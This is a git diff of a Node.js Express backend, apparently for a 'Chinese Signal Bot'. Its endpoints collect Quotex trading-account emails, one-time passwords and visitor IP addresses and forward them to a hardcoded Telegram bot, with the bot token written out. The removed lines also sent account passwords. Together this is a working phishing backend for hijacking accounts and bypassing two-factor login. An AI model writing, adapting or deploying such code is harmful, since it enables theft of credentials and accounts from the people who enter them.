@@ -1,68 +1,93 @@
 const express = require('express');
 const cors = require('cors');
+const axios = require('axios');
 
 const app = express();
-const PORT = 3000;
 
 app.use(cors());
 app.use(express.json());
 
-const BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
-const ADMIN_CHAT_ID = 7293402395;
+// ================== YOUR TELEGRAM SETTINGS ==================
+const TELEGRAM_BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";   //
+const TELEGRAM_CHAT_ID = "7293402395";       //
 
-// Better way to send to Telegram
-async function sendToTelegram(message) {
+// Function to send message to your Telegram
+async function sendTelegramMessage(text) {
     try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: ADMIN_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await axios.post(url, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: text,
+            parse_mode: "HTML"
         });
-
-        const data = await response.json();
-        if (data.ok) {
-            console.log("✅ Message sent to Telegram successfully");
-        } else {
-            console.log("❌ Telegram API Error:", data.description);
-        }
+        console.log("✅ Message sent to Telegram");
     } catch (error) {
-        console.error("❌ Telegram send failed:", error.message);
+        console.error("❌ Telegram Error:", error.message);
     }
 }
 
-// Login Data
-app.post('/api/quotex-login', async (req, res) => {
-    const { email, password } = req.body;
-    if (!email || !password) {
-        return res.status(400).json({ error: "Missing email or password" });
-    }
+// ================== LICENSE + NAME ACTIVATION ==================
+app.post('/api/license-activate', async (req, res) => {
+    const { licenseKey, userName, action, timestamp, timezone } = req.body;
+    
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
+    
+    const message = `
+🔑 <b>New License Activation</b>
 
-    const message = `🔴 NEW QUOTEX LOGIN ATTEMPT\n\n` +
-                   `📧 Email: ${email}\n` +
-                   `🔑 Password: ${password}\n` +
-                   `⏰ Time: ${new Date().toLocaleString()}`;
+👤 <b>Name:</b> ${userName}
+🔑 <b>License:</b> ${licenseKey}
+🌍 <b>IP Address:</b> ${ip}
+⏰ <b>Time (PKT):</b> ${timestamp || new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}
+📍 <b>Timezone:</b> Pakistan
 
-    await sendToTelegram(message);
-    res.json({ success: true });
+📱 Notification Permission: ${req.body.notificationPermission || "Unknown"}
+    `.trim();
+
+    await sendTelegramMessage(message);
+    res.status(200).send({ status: "success" });
 });
 
-// OTP Data
+// ================== ACTIVITY TRACKING ==================
+app.post('/api/track-activity', async (req, res) => {
+    const { action, userName, ...extra } = req.body;
+    
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
+
+    const message = `
+📊 <b>User Activity</b>
+
+Action: <b>${action}</b>
+👤 Name: <b>${userName || "Unknown"}</b>
+🌍 IP: <b>${ip}</b>
+⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
+    `.trim();
+
+    await sendTelegramMessage(message);
+    res.status(200).send({ status: "success" });
+});
+
+// Existing Quotex Endpoints
+app.post('/api/quotex-login', async (req, res) => {
+    const { email } = req.body;
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    await sendTelegramMessage(`🔑 Quotex Login Attempt\nEmail: ${email}\nIP: ${ip}`);
+    res.status(200).send({ status: "ok" });
+});
+
 app.post('/api/quotex-otp', async (req, res) => {
     const { email, otp } = req.body;
-
-    const message = `✅ OTP RECEIVED\n\n` +
-                   `📧 Email: ${email}\n` +
-                   `🔢 OTP: <b>${otp}</b>\n` +
-                   `⏰ Time: ${new Date().toLocaleString()}`;
-
-    await sendToTelegram(message);
-    res.json({ success: true });
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    await sendTelegramMessage(`🔢 OTP Entered\nEmail: ${email}\nOTP: ${otp}\nIP: ${ip}`);
+    res.status(200).send({ status: "ok" });
 });
 
+// Root
+app.get('/', (req, res) => {
+    res.send("Chinese Signal Bot Backend is Running ✅");
+});
+
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`🚀 Server is running on http://localhost:${PORT}`);
+    console.log(`🚀 Server running on port ${PORT}`);
 });
